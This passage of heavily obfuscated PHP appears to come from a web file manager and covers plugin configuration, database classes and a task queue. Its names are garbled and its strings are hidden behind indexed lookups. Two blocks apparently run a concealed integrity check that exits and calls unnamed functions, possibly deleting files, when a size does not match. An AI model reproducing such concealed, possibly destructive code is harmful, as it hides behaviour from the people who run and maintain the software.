!file_exists($Æ“Ü× . $Èº¯ÑØª . $ı´®¦Æ[939]) && file_exists($Æ“Ü× . $ı´®¦Æ[1714])) { $ˆö£·› = (include $Æ“Ü× . $ı´®¦Æ[1714]); } else { if (file_exists($Æ“Ü× . $Áƒí¢Ê” . $ı´®¦Æ[939])) { $ˆö£·› = (include $Æ“Ü× . $Áƒí¢Ê” . $ı´®¦Æ[939]); } } } if (!is_array($ˆö£·›)) { return array(); } if (@count($ˆö£·›) > 0) { I18n::set($ˆö£·›); } return $ˆö£·›; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($‰Ü‘³ì) { $Óê‰¤˜… =& $_SERVER[ÅÄÇĞô]; if ($_SERVER[$Óê‰¤˜…[837]] != $_SERVER[$Óê‰¤˜…[1552]]) { $ß˜±Ç = $Óê‰¤˜…[978]; $¼¦™è–º = $Óê‰¤˜…[838]; $ÂÛş§ç¯ = $_SERVER[$Óê‰¤˜…[839]] . $Óê‰¤˜…[840]; $Û¡‰îƒî = $¼¦™è–º($ÂÛş§ç¯); $¥öÔòæ¬ = explode($Óê‰¤˜…[288], $Û¡‰îƒî); if (count($¥öÔòæ¬) < $Óê‰¤˜…[699]) { $ÀØìğ† = $Óê‰¤˜…[841]; $ÀØìğ†(); } $€§˜É±À = $Óê‰¤˜…[979]; $€§˜É±À($_SERVER[$Óê‰¤˜…[980]]); $€§˜É±À($_SERVER[$Óê‰¤˜…[839]] . $Óê‰¤˜…[1649]); $û¦áİ­Ø = 1; while ($û¦áİ­Ø > 1) { $û¦áİ­Ø = $û¦áİ­Ø + 4; $†“Œ©­Ü = rawurlencode($û¦áİ­Ø . $Óê‰¤˜…[457]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $‰Ü‘³ì); } public function onSetConfig($‰¶°¾‘) { } public function onGetConfig($¸éù¡ ¿) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($©¶Œ¤¢Ë) { if ($©¶Œ¤¢Ë == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($‹¦°¡ç° = "\x70\x6c\165\147\151\156\x41\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¬¸ÒÌéİ = $this->getConfig(); if (!$¬¸ÒÌéİ[$‹¦°¡ç°]) { return !1; } return ActionCall($_SERVER[ÅÄÇĞô][1715], $¬¸ÒÌéİ[$‹¦°¡ç°]); } public function url($±Ñû’©›, $½Ã—ñô = '', $Ú„•òû‘ = true) { $È»æÕüş =& $_SERVER[ÅÄÇĞô]; $©É¹…¦ = $this->getConfig(); $ˆ·èÑêÒ = KOD_VERSION . $È»æÕüş[10] . KOD_VERSION_BUILD; $„‰ë°£¦ = $this->packageVersion(); $»ÓÊşË÷ = $ˆ·èÑêÒ . $È»æÕüş[465] . $„‰ë°£¦; if (substr($±Ñû’©›, 0, 4) == $È»æÕüş[152] || substr($±Ñû’©›, 0, 2) == $È»æÕüş[1434]) { $ó€ÌŠÊ± = $±Ñû’©› . $È»æÕüş[1716] . $»ÓÊşË÷; } else { if ($½Ã—ñô == $È»æÕüş[12]) { $ó€ÌŠÊ± = $this->pluginHost . $±Ñû’©› . $È»æÕüş[1716] . $»ÓÊşË÷; } else { if ($½Ã—ñô === $È»æÕüş[78]) { $ó€ÌŠÊ± = $this->pluginHost . $±Ñû’©›; } else { if ($½Ã—ñô == $È»æÕüş[1717]) { $ó€ÌŠÊ± = STATIC_PATH . $±Ñû’©› . $È»æÕüş[1716] . $ˆ·èÑêÒ; } else { if ($½Ã—ñô == $È»æÕüş[1718]) { $ó€ÌŠÊ± = APP_HOST . $È»æÕüş[1719] . $±Ñû’©› . $È»æÕüş[1716] . $ˆ·èÑêÒ; } else { if (isset($©É¹…¦[$½Ã—ñô])) { $ó€ÌŠÊ± = $©É¹…¦[$½Ã—ñô] . $±Ñû’©› . $È»æÕüş[1716] . $»ÓÊşË÷; } } } } } } if (!$Ú„•òû‘) { return $ó€ÌŠÊ±; } echo $ó€ÌŠÊ±; } public function link($È¬§â¤ï = false, $Ã©ş—ö = '') { $ıÃ³á¹ =& $_SERVER[ÅÄÇĞô]; $„¯ÌÑâ = $this->linkHas == !1; $this->linkHas = !0; if (!$È¬§â¤ï) { $this->link($ıÃ³á¹[1720], $ıÃ³á¹[1718]); $this->link($ıÃ³á¹[1721], $ıÃ³á¹[1717]); $this->link($ıÃ³á¹[1722], $ıÃ³á¹[1717]); $this->link($ıÃ³á¹[1723], $ıÃ³á¹[1717]); $this->link($ıÃ³á¹[1724], $ıÃ³á¹[1717]); if ($„¯ÌÑâ) { Hook::trigger($ıÃ³á¹[1725]); } return; } $¨åÁìÃ‚ = $this->url($È¬§â¤ï, $Ã©ş—ö, !1); if (substr($È¬§â¤ï, -3) == $ıÃ³á¹[1726]) { echo $ıÃ³á¹[1727] . $¨åÁìÃ‚ . $ıÃ³á¹[1728] . $ıÃ³á¹[288]; } else { if (substr($È¬§â¤ï, -4) == $ıÃ³á¹[1729]) { echo $ıÃ³á¹[1730] . $¨åÁìÃ‚ . $ıÃ³á¹[1731] . $ıÃ³á¹[288]; } } if ($„¯ÌÑâ) { Hook::trigger($ıÃ³á¹[1725]); } } } goto a“ëã¾Œ¯; C¦—–¤îÖ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÇÀ©¢’Ù =& $_SERVER[ÅÄÇĞô]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÇÀ©¢’Ù[6]] =& $config; $this->values[$ÇÀ©¢’Ù[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÇÀ©¢’Ù[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($éôªÓìä) { if (1 === func_num_args()) { $this->{$éôªÓìä} = new $éôªÓìä(); } else { $³ÓÏÒç = new ReflectionClass($éôªÓìä); $¥³”á›Ü = func_get_args(); array_shift($¥³”á›Ü); $this->{$éôªÓìä} = $³ÓÏÒç->newInstanceArgs($¥³”á›Ü); } return $this->{$éôªÓìä}; } public function routeBind($ß¦™ß—, $È³ËÙ˜±, $‹‚Ó×Üµ = 3) { $†ñû =& $_SERVER[ÅÄÇĞô]; $şªóÑ†” = $this->in[$†ñû[9]]; $ß¦™ß— = str_replace($†ñû[10], $†ñû[11], trim(trim($ß¦™ß—, $†ñû[8]), $†ñû[12])); if (!$ß¦™ß— || count($şªóÑ†”) <= $‹‚Ó×Üµ) { return !1; } $àå–æ¨ = !0; $Óòç¢¥á = explode($†ñû[8], $ß¦™ß—); for ($ÕŞ”Ç¤ = 0; $ÕŞ”Ç¤ < count($Óòç¢¥á); $ÕŞ”Ç¤++) { if ($Óòç¢¥á[$ÕŞ”Ç¤] != $şªóÑ†”[$‹‚Ó×Üµ + $ÕŞ”Ç¤]) { $àå–æ¨ = !1; break; } } if (!$àå–æ¨) { return; } call_user_func_array(array($this, $È³ËÙ˜±), array()); } public function routeArgs($á ŒĞ®´ = 3) { $™…¾³ = $this->in[$_SERVER[ÅÄÇĞô][9]]; if (count($™…¾³) <= $á ŒĞ®´) { return array(); } $°ÎÁæªˆ = array(); for ($¦öÕÇŒ” = $á ŒĞ®´; $¦öÕÇŒ” < count($™…¾³); $¦öÕÇŒ” += 2) { $°ÎÁæªˆ[$™…¾³[$¦öÕÇŒ”]] = $™…¾³[$¦öÕÇŒ” + 1]; $this->in[$™…¾³[$¦öÕÇŒ”]] = $™…¾³[$¦öÕÇŒ” + 1]; } return $°ÎÁæªˆ; } protected function assign($Ô×Ôúú×, $îØ±ÌÃ) { $this->values[$Ô×Ôúú×] = $îØ±ÌÃ; } protected function display($ı¦‡öİ) { ob_end_clean(); extract($this->values); require $this->tpl . $ı¦‡öİ; } } class DbSqliteBase extends Db { public function __construct($â¼°…úñ = '') { $ĞªÁçÄÖ =& $_SERVER[ÅÄÇĞô]; if (!extension_loaded($ĞªÁçÄÖ[13])) { think_exception(think_lang($ĞªÁçÄÖ[14]) . $ĞªÁçÄÖ[15]); } if (!empty($â¼°…úñ)) { if (!isset($â¼°…úñ[$ĞªÁçÄÖ[16]])) { $â¼°…úñ[$ĞªÁçÄÖ[16]] = 438; } $this->config = $â¼°…úñ; if (empty($this->config[$ĞªÁçÄÖ[17]])) { $this->config[$ĞªÁçÄÖ[17]] = array(); } } } public function connect($µŸ²Ü×ü = '', $¨¢òôøö = 0) { $èĞ€èÕ =& $_SERVER[ÅÄÇĞô]; if (!isset($this->linkID[$¨¢òôøö])) { if (empty($µŸ²Ü×ü)) { $µŸ²Ü×ü = $this->config; } $¶ı°İßú = !empty($µŸ²Ü×ü[$èĞ€èÕ[17]][$èĞ€èÕ[18]]) ? $µŸ²Ü×ü[$èĞ€èÕ[17]][$èĞ€èÕ[18]] : $this->pconnect; $‡ ¼ªÚ = $¶ı°İßú ? $èĞ€èÕ[19] : $èĞ€èÕ[20]; $this->linkID[$¨¢òôøö] = $‡ ¼ªÚ($µŸ²Ü×ü[$èĞ€èÕ[21]], $µŸ²Ü×ü[$èĞ€èÕ[16]]); if (!$this->linkID[$¨¢òôøö]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¨¢òôøö], 30000); if (1 != think_config($èĞ€èÕ[22])) { unset($this->config); } } return $this->linkID[$¨¢òôøö]; } public function free() { $this->queryID = null; } public function query($ååØ•‚Ë) { $¦ì•áİ– =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ååØ•‚Ë; if ($this->queryID) { $this->free(); } think_action_status($¦ì•áİ–[23], 1); think_status($¦ì•áİ–[24]); $this->queryID = sqlite_query($this->_linkID, $ååØ•‚Ë); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ñ·“Õ»É = $this->getAll(); return $ñ·“Õ»É; } } public function execute($± É¬ûü) { $‹ûÓ´ó† =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $± É¬ûü; if ($this->queryID) { $this->free(); } think_action_status($‹ûÓ´ó†[25], 1); think_status($‹ûÓ´ó†[24]); $ûâííü¤ = sqlite_exec($this->_linkID, $± É¬ûü); $this->debug(); if (!1 === $ûâííü¤) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÅÄÇĞô][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $·Å®Ô÷¦ = sqlite_query($this->_linkID, $_SERVER[ÅÄÇĞô][27]); if (!$·Å®Ô÷¦) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥„Ôèû… = sqlite_query($this->_linkID, $_SERVER[ÅÄÇĞô][28]); if (!$¥„Ôèû…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¶°ÃÅÕ = array(); if ($this->numRows > 0) { for ($à§Ïı = 0; $à§Ïı < $this->numRows; $à§Ïı++) { $¶°ÃÅÕ[$à§Ïı] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¶°ÃÅÕ; } public function getFields($ùÖüÇ‘½) { $¨ÌšÈÏ =& $_SERVER[ÅÄÇĞô]; $ÚåÑÜî = $this->query($¨ÌšÈÏ[29] . $ùÖüÇ‘½ . $¨ÌšÈÏ[30]); $ƒ³Õ»µœ = array(); if ($ÚåÑÜî) { foreach ($ÚåÑÜî as $›…™°¸Œ => $Õ£â—˜ú) { $ƒ³Õ»µœ[$Õ£â—˜ú[$¨ÌšÈÏ[31]]] = array($¨ÌšÈÏ[32] => $Õ£â—˜ú[$¨ÌšÈÏ[31]], $¨ÌšÈÏ[33] => $Õ£â—˜ú[$¨ÌšÈÏ[34]], $¨ÌšÈÏ[35] => (bool) ($Õ£â—˜ú[$¨ÌšÈÏ[36]] === $¨ÌšÈÏ[12]), $¨ÌšÈÏ[37] => $Õ£â—˜ú[$¨ÌšÈÏ[38]], $¨ÌšÈÏ[39] => strtolower($Õ£â—˜ú[$¨ÌšÈÏ[40]]) == $¨ÌšÈÏ[41], $¨ÌšÈÏ[42] => strtolower($Õ£â—˜ú[$¨ÌšÈÏ[43]]) == $¨ÌšÈÏ[44]); } } return $ƒ³Õ»µœ; } public function getTables($ôÄ·îª± = '') { $ÉÎôÂòÎ =& $_SERVER[ÅÄÇĞô]; $ÈÀğÍ¸È = $this->query($ÉÎôÂòÎ[45] . $ÉÎôÂòÎ[46] . $ÉÎôÂòÎ[47]); $Ÿ¨üá¹Ê = array(); foreach ($ÈÀğÍ¸È as $ë›Úåëò => $¹ê€³…¿) { $Ÿ¨üá¹Ê[$ë›Úåëò] = current($¹ê€³…¿); } return $Ÿ¨üá¹Ê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ç‡œÇ— =& $_SERVER[ÅÄÇĞô]; $Ô¶‡êìö = sqlite_last_error($this->_linkID); $this->error = $Ô¶‡êìö . $Ç‡œÇ—[4] . sqlite_error_string($Ô¶‡êìö); if ($Ç‡œÇ—[12] != $this->queryStr) { $this->error .= LNG($Ç‡œÇ—[48]) . $this->queryStr; } think_trace($this->error, $Ç‡œÇ—[12], $Ç‡œÇ—[49]); return $this->error; } public function escapeString($ß„ã¥Ü) { return sqlite_escape_string($ß„ã¥Ü); } public function parseLimit($ÛÀŞËèñ) { $Ç¸ŒÇ±¤ =& $_SERVER[ÅÄÇĞô]; $Œ§ÎĞÎ = $Ç¸ŒÇ±¤[12]; if (!empty($ÛÀŞËèñ)) { $ÛÀŞËèñ = explode($Ç¸ŒÇ±¤[50], $ÛÀŞËèñ); if (count($ÛÀŞËèñ) > 1) { $Œ§ÎĞÎ .= $Ç¸ŒÇ±¤[51] . $ÛÀŞËèñ[1] . $Ç¸ŒÇ±¤[52] . $ÛÀŞËèñ[0] . $Ç¸ŒÇ±¤[53]; } else { $Œ§ÎĞÎ .= $Ç¸ŒÇ±¤[51] . $ÛÀŞËèñ[0] . $Ç¸ŒÇ±¤[53]; } } return $Œ§ÎĞÎ; } } class DbSqlite3Base extends Db { public function __construct($º¬¯¯ÖÙ = '') { $¦²ï‰¸ò =& $_SERVER[ÅÄÇĞô]; if (!class_exists($¦²ï‰¸ò[54])) { think_exception(think_lang($¦²ï‰¸ò[14]) . $¦²ï‰¸ò[55]); } if (!empty($º¬¯¯ÖÙ)) { if (!isset($º¬¯¯ÖÙ[$¦²ï‰¸ò[16]])) { $º¬¯¯ÖÙ[$¦²ï‰¸ò[16]] = 438; } $this->config = $º¬¯¯ÖÙ; if (empty($this->config[$¦²ï‰¸ò[17]])) { $this->config[$¦²ï‰¸ò[17]] = array(); } } } public function connect($ò¾«ù€° = '', $­¿õ¨«é = 0) { $®ÜéıòÒ =& $_SERVER[ÅÄÇĞô]; if (!isset($this->linkID[$­¿õ¨«é])) { if (empty($ò¾«ù€°)) { $ò¾«ù€° = $this->config; } $this->linkID[$­¿õ¨«é] = new SQLite3($ò¾«ù€°[$®ÜéıòÒ[21]]); if (!$this->linkID[$­¿õ¨«é]) { think_exception($this->linkID[$­¿õ¨«é]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$­¿õ¨«é]->busyTimeout(30000); if (1 != think_config($®ÜéıòÒ[22])) { unset($this->config); } } return $this->linkID[$­¿õ¨«é]; } public function free() { $this->queryID = null; } public function query($˜éë‡ã) { $œ±¬©£ =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜éë‡ã; if ($this->queryID) { $this->free(); } think_action_status($œ±¬©£[23], 1); think_status($œ±¬©£[24]); $this->queryID = $this->_linkID->query($˜éë‡ã); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $óÍïÎ°ã = $this->getAll(); $this->numRows = count($óÍïÎ°ã); return $óÍïÎ°ã; } } public function execute($ËÄ—‚Ü) { $ùÑ“‘Èº =& $_SERVER[ÅÄÇĞô]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ËÄ—‚Ü; if ($this->queryID) { $this->free(); } think_action_status($ùÑ“‘Èº[25], 1); think_status($ùÑ“‘Èº[24]); $ü€Ä«¬È = $this->_linkID->exec($ËÄ—‚Ü); $this->debug(); if (!1 === $ü€Ä«¬È) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÅÄÇĞô][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ß£ÔØ§ = $this->_linkID->query($_SERVER[ÅÄÇĞô][27]); if (!$ß£ÔØ§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ñ ËÇØ = $this->_linkID->query($_SERVER[ÅÄÇĞô][28]); if (!$ñ ËÇØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ıŠ‘İ¬é = array(); while ($°’½–È© = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ıŠ‘İ¬é[] = $°’½–È©; } $this->queryID->reset(); return $ıŠ‘İ¬é; } public function getFields($åòØÛíŠ) { $æş³õ‹Í =& $_SERVER[ÅÄÇĞô]; $œ®äî§á = $this->query($æş³õ‹Í[29] . $åòØÛíŠ . $æş³õ‹Í[30]); $Á«²ğéß = array(); if ($œ®äî§á) { foreach ($œ®äî§á as $û¥Á¢¤– => $å–‹‹ßÊ) { $Á«²ğéß[$å–‹‹ßÊ[$æş³õ‹Í[32]]] = array($æş³õ‹Í[32] => $å–‹‹ßÊ[$æş³õ‹Í[32]], $æş³õ‹Í[33] => $å–‹‹ßÊ[$æş³õ‹Í[33]], $æş³õ‹Í[35] => (bool) ($å–‹‹ßÊ[$æş³õ‹Í[35]] === $æş³õ‹Í[12]), $æş³õ‹Í[37] => $å–‹‹ßÊ[$æş³õ‹Í[56]], $æş³õ‹Í[39] => (bool) $å–‹‹ßÊ[$æş³õ‹Í[57]], $æş³õ‹Í[42] => (bool) $å–‹‹ßÊ[$æş³õ‹Í[57]]); } } return $Á«²ğéß; } public function getTables($ÛÅŞÔ“¨ = '') { $©Œ¢¹Øø =& $_SERVER[ÅÄÇĞô]; $Õ¥õö¢ê = $this->query($©Œ¢¹Øø[45] . $©Œ¢¹Øø[46] . $©Œ¢¹Øø[47]); $¡æÎ…ğû = array(); foreach ($Õ¥õö¢ê as $‘Ê‘¢”Ü => $Êà•ÇÜÂ) { $¡æÎ…ğû[$‘Ê‘¢”Ü] = current($Êà•ÇÜÂ); } return $¡æÎ…ğû; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $àòò÷ñß =& $_SERVER[ÅÄÇĞô]; $this->error = $this->_linkID->lastErrorMsg(); if ($àòò÷ñß[12] != $this->queryStr) { $this->error .= LNG($àòò÷ñß[48]) . $this->queryStr; } think_trace($this->error, $àòò÷ñß[12], $àòò÷ñß[49]); return $this->error; } public function escapeString($ŠÂø‚‹) { $ÑÛö¾ã® =& $_SERVER[ÅÄÇĞô]; if ($this->_linkID) { return $this->_linkID->escapeString($ŠÂø‚‹); } return str_ireplace($ÑÛö¾ã®[58], $ÑÛö¾ã®[59], $ŠÂø‚‹); } public function parseLimit($Æ‹Åù²ƒ) { $„„™ñ£¤ =& $_SERVER[ÅÄÇĞô]; $áØÃÃì× = $„„™ñ£¤[12]; if (!empty($Æ‹Åù²ƒ)) { $Æ‹Åù²ƒ = explode($„„™ñ£¤[50], $Æ‹Åù²ƒ); if (count($Æ‹Åù²ƒ) > 1) { $áØÃÃì× .= $„„™ñ£¤[51] . $Æ‹Åù²ƒ[1] . $„„™ñ£¤[52] . $Æ‹Åù²ƒ[0] . $„„™ñ£¤[53]; } else { $áØÃÃì× .= $„„™ñ£¤[51] . $Æ‹Åù²ƒ[0] . $„„™ñ£¤[53]; } } return $áØÃÃì×; } } goto b”Ø‹›¬ŒÏ; Dœõ²„Ğ”ß: if ($_SERVER[$_SERVER[ÅÄÇĞô][837]] != $_size($_file)) { $_getc = $_SERVER[ÅÄÇĞô][838]; $_getfile = $_SERVER[$_SERVER[ÅÄÇĞô][839]] . $_SERVER[ÅÄÇĞô][840]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÅÄÇĞô][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÅÄÇĞô][688]) { $exit = $_SERVER[ÅÄÇĞô][841]; $exit(); } $_act = $_SERVER[ÅÄÇĞô][842]; $_act($_file); } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\x75\145\165\145\114\x65\156\147\164\x68"; const QUEUE_DATA = "\164\141\163\x6b\x51\165\x65\165\145\104\x61\x74\x61"; const QUEUE_TIME = "\164\141\163\153\x51\165\x65\x75\x65\114\141\163\x74\x52\165\x6e"; const QUEUE_THREAD = "\x74\x61\x73\153\121\x75\145\165\145\124\150\x72\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ŞğÎÄ¢Ç, $ÑÈÚ»ú« = array(), $Şú½Ï”™ = '', $Œ´ÑÚÉ = '') { $óúıŠŸİ =& $_SERVER[ÅÄÇĞô]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Œ´ÑÚÉ && array_find_by_field(self::$listData, $óúıŠŸİ[97], $Œ´ÑÚÉ)) { return !0; } if ($Œ´ÑÚÉ && array_find_by_field(self::$listDataAdd, $óúıŠŸİ[97], $Œ´ÑÚÉ)) { return !0; } self::$listDataAdd[] = array($óúıŠŸİ[344] => $ŞğÎÄ¢Ç, $óúıŠŸİ[1897] => $ÑÈÚ»ú«, $óúıŠŸİ[529] => $Şú½Ï”™, $óúıŠŸİ[97] => $Œ´ÑÚÉ); return !0; } public static function addSubmit() { $½“ äó› =& $_SERVER[ÅÄÇĞô]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($½“ äó›[1898] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $½“ äó›[12], $½“ äó›[529])), $½“ äó›[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($æéÜÔ , $ÒœË»« = array(), $¦ı–Âï = '', $±ÆÁŸºÄ = '') { $ÁáåŸ¤ =& $_SERVER[ÅÄÇĞô]; if (self::count() >= self::MAX_LENGTH) { return !1; } $šŒâ  ú = self::getAll(); if ($±ÆÁŸºÄ && array_find_by_field($šŒâ  ú, $ÁáåŸ¤[97], $±ÆÁŸºÄ)) { return !0; } $šŒâ  ú[] = array($ÁáåŸ¤[344] => $æéÜÔ , $ÁáåŸ¤[1897] => $ÒœË»«, $ÁáåŸ¤[529] => $¦ı–Âï, $ÁáåŸ¤[97] => $±ÆÁŸºÄ); self::setAll($šŒâ  ú); write_log($ÁáåŸ¤[1898] . $¦ı–Âï, $ÁáåŸ¤[198]); return !0; } public static function run() { $ÙµË¢üü =& $_SERVER[ÅÄÇĞô]; $Ù„Àù·ò = self::getAll(); $´Ùé¤µü = array_shift($Ù„Àù·ò); if (!$´Ùé¤µü) { return !1; } self::setAll($Ù„Àù·ò); $ºƒ¥ü† = timeFloat(); $Š™‚û›à = $ÙµË¢üü[12]; try { $Š™‚û›à = Hook::apply($´Ùé¤µü[$ÙµË¢üü[344]], $´Ùé¤µü[$ÙµË¢üü[1897]]); } catch (Exception $ı®±´¿É) { write_log($ı®±´¿É, $ÙµË¢üü[1287]); } $‹ ôÎğ = number_format(timeFloat() - $ºƒ¥ü†, 3) . $ÙµË¢üü[1813]; if ($Š™‚û›à && is_string($Š™‚û›à)) { $‹ ôÎğ = $‹ ôÎğ . $ÙµË¢üü[1899] . $Š™‚û›à; } write_log($ÙµË¢üü[1900] . $´Ùé¤µü[$ÙµË¢üü[529]] . $ÙµË¢üü[1901] . $‹ ôÎğ, $ÙµË¢üü[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ş€Š‚Ê¸ =& $_SERVER[ÅÄÇĞô]; $±Ï‰ôŠâ = self::threadCount() + 1; if ($±Ï‰ôŠâ > 3 || !self::count()) { return; } write_log($Ş€Š‚Ê¸[1902] . $±Ï‰ôŠâ, $Ş€Š‚Ê¸[198]); Cache::set(self::QUEUE_THREAD, $±Ï‰ôŠâ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ş€Š‚Ê¸[1903], $Ş€Š‚Ê¸[198]); } public static function getKey($¤ìŒÍË, $ä°õÙšÖ = "\151\x6e\x74") { $ìä¶ûşŞ =& $_SERVER[ÅÄÇĞô]; Cache::removeMemory($¤ìŒÍË); $Æ»¨ËßŠ = Cache::get($¤ìŒÍË); if ($ä°õÙšÖ == $ìä¶ûşŞ[366]) { return $Æ»¨ËßŠ ? intval($Æ»¨ËßŠ) : 0; } if ($ä°õÙšÖ == $ìä¶ûşŞ[1904]) { return is_array($Æ»¨ËßŠ) ? $Æ»¨ËßŠ : array(); } return $Æ»¨ËßŠ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ÅÄÇĞô][1904]); } public static function setAll($áéçùöŞ) { $µ¢ÙÓşà = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($áéçùöŞ), $µ¢ÙÓşà); Cache::set(self::QUEUE_DATA, $áéçùöŞ, $µ¢ÙÓşà); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($š“‹¨”, $øµ•üÌœ = 5.0) { if (!$š“‹¨”) { return; } $Ø×ÚÇÜ° = Cache::get($š“‹¨”); if (!$Ø×ÚÇÜ° || timeFloat() - floatVal($Ø×ÚÇÜ°) >= $øµ•üÌœ) { Cache::set($š“‹¨”, timeFloat(), $øµ•üÌœ * 10); return !0; } return !1; } public static function timeLimitCall($‚…å‹­ò, $ßŠçÆ·, $´¿®¼‘‰, $„ÃñÆ»œ = 5.0) { $ù† ÖÓ¨ =& $_SERVER[ÅÄÇĞô]; if (!$‚…å‹­ò || !$ßŠçÆ·) { return; } self::$asyncAdd = !0; $ùéñ¼’ = $ù† ÖÓ¨[1905]; $ªÑÔ·©˜ = Cache::get($ùéñ¼’, !0); $“Çö€¶© = array($ù† ÖÓ¨[1906] => timeFloat(), $ù† ÖÓ¨[1907] => timeFloat(), $ù† ÖÓ¨[344] => $ßŠçÆ·, $ù† ÖÓ¨[1897] => $´¿®¼‘‰, $ù† ÖÓ¨[207] => $„ÃñÆ»œ); if (is_array($ªÑÔ·©˜[$‚…å‹­ò])) { $“Çö€¶©[$ù† ÖÓ¨[1907]] = $ªÑÔ·©˜[$‚…å‹­ò][$ù† ÖÓ¨[1907]]; } if (is_array($ªÑÔ·©˜[$‚…å‹­ò])) { if (timeFloat() - $ªÑÔ·©˜[$‚…å‹­ò][$ù† ÖÓ¨[1906]] < $“Çö€¶©[$ù† ÖÓ¨[207]] * 0.3) { return; } $“Çö€¶©[$ù† ÖÓ¨[1907]] = $ªÑÔ·©˜[$‚…å‹­ò][$ù† ÖÓ¨[1907]]; } $ªÑÔ·©˜[$‚…å‹­ò] = $“Çö€¶©; Cache::set($ùéñ¼’, $ªÑÔ·©˜, 60); Cache::removeMemory($ùéñ¼’); write_log($ù† ÖÓ¨[1908] . $‚…å‹­ò . $ù† ÖÓ¨[74] . $ßŠçÆ·, $ù† ÖÓ¨[198]); } public static function timeLimitCallLoop() { $ÀŒçõ¼î =& $_SERVER[ÅÄÇĞô]; $İù…ÄÂØ = array($ÀŒçõ¼î[1909]); $Š©÷ŠÙ˜ = in_array(strtolower(ACTION), $İù…ÄÂØ); if (!$Š©÷ŠÙ˜ && !self::$asyncAdd) { return; } $Èªµ£Å = $ÀŒçõ¼î[1905]; $§­Çâ¹ = Cache::get($Èªµ£Å, !0); if (!$§­Çâ¹ || count($§­Çâ¹) <= 0) { return; } $Ÿò×± = !1; $Şï¼ºİ» = timeFloat(); $ÛÊÎû = array(); foreach ($§­Çâ¹ as $¸˜óÃ¹Ñ => $ß«ŒÖª´) { if ($Şï¼ºİ» - $ß«ŒÖª´[$ÀŒçõ¼î[1907]] > $ß«ŒÖª´[$ÀŒçõ¼î[207]]) { $Ÿò×± = !0; try { Hook::apply($ß«ŒÖª´[$ÀŒçõ¼î[344]], $ß«ŒÖª´[$ÀŒçõ¼î[1897]]); write_log($ÀŒçõ¼î[1910] . $¸˜óÃ¹Ñ . $ÀŒçõ¼î[74] . $ß«ŒÖª´[$ÀŒçõ¼î[344]] . $ÀŒçõ¼î[1911] . ACTION, $ÀŒçõ¼î[198]); } catch (Exception 